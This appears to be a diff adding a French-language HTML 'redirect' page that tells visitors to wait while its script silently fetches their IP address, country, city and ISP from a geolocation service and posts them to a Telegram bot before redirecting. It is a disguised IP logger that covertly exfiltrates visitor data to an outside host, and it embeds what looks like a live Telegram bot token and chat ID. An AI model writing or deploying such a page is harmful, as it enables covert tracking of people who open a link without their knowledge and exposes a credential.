@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirection en cours...</title>
+</head>
+<body>
+  <p>Veuillez patienter quelques secondes...</p>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "7967930041:AAElDO_dYpB824Damck0FJ-pCwlxZuqCKog"; // 🔁 Remplace par ton token
+    const CHAT_ID = "6996434307";                                      // 🔁 Remplace par ton chat ID
+    const REDIRECT_URL = "https://example.com";                       // 🔁 Lien de redirection
+
+    fetch("https://ipapi.dev/json/")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip || "Inconnue";
+        const country = data.country_name || "Inconnu";
+        const city = data.city || "Inconnue";
+        const org = data.org || "Inconnu";
+
+        const message = `🌍 Nouvelle visite :
+IP: ${ip}
+Pays: ${country}
+Ville: ${city}
+Fournisseur: ${org}`;
+
+        console.log("📨 Données Telegram :", message);
+
+        return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        }).then(resp => {
+          if (!resp.ok) {
+            return resp.text().then(text => {
+              console.error("❌ Erreur Telegram :", text);
+              alert("Erreur Telegram : " + text);
+            });
+          }
+        });
+      })
+      .catch(error => {
+        console.error("❌ Erreur IPAPI.DEV :", error);
+        alert("Erreur IP : " + error.message);
+      })
+      .finally(() => {
+        window.location.href = REDIRECT_URL;
+      });
+  </script>
+</body>
+</html>
